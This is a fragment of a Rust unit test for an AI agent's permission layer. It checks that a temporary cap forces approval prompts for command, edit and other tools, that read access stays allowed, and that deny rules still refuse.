                SharedRules::new(vec![rule(tool, "", RuleAction::Allow)]),
                SharedRules::default(),
            )
            .with_mode(PermissionMode::Full)
        };
        let other = |asks| CallKind::Other { asks };
        for (tool, kind) in [
            ("web_search", other(false)),
            ("mcp__srv__lookup", other(true)),
            ("ext_tool", other(false)),
            ("run_command", CallKind::Execute),
            ("write_file", CallKind::Edit),
        ] {
            let permissions = allow(tool);
            let judge = |p: &Permissions| p.judge(tool, &Target::Other, kind, None).decision;
            assert_eq!(judge(&permissions), RUN, "{tool} runs when not capped");
            permissions.cap();
            permissions.cap();
            assert_eq!(judge(&permissions), ASK_EVERY_TIME, "{tool}");
            // Floored, so a pre-approved tool is asked about too.
            assert!(
                permissions.judge(tool, &Target::Other, kind, None).floored,
                "{tool}"
            );
            permissions.uncap();
            assert!(permissions.is_capped());
            permissions.uncap();
            assert_eq!(judge(&permissions), RUN, "{tool} after the cap");
        }
        let permissions = allow("read_file");
        permissions.cap();
        assert_eq!(
            permissions
                .judge("read_file", &Target::Other, CallKind::Read, None)
                .decision,
            RUN
        );
        let denied = Permissions::new(
            SharedRules::new(vec![rule("web_search", "", RuleAction::Deny)]),
            SharedRules::default(),
        );
        denied.cap();
        assert_eq!(
            denied
                .judge("web_search", &Target::Other, other(false), None)
                .decision,
            Decision::Refuse(Refusal::Rule)
        );
    }
}
